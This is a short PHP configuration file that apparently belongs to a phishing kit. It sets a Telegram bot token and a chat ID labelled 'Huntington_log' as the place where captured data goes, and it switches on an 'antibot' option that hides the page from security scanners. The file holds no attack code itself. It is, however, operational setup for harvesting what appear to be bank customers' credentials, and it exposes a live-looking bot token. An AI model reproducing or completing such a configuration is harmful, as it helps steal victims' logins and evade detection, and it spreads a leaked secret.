<?php 


$bot = "8028203389:AAFVplJrU1ssJYC2vRFdakp7oeQQzdedYgg";
$chat_id = "Huntington_log";

// use antibot? yes|no
$antibot = "yes";



?>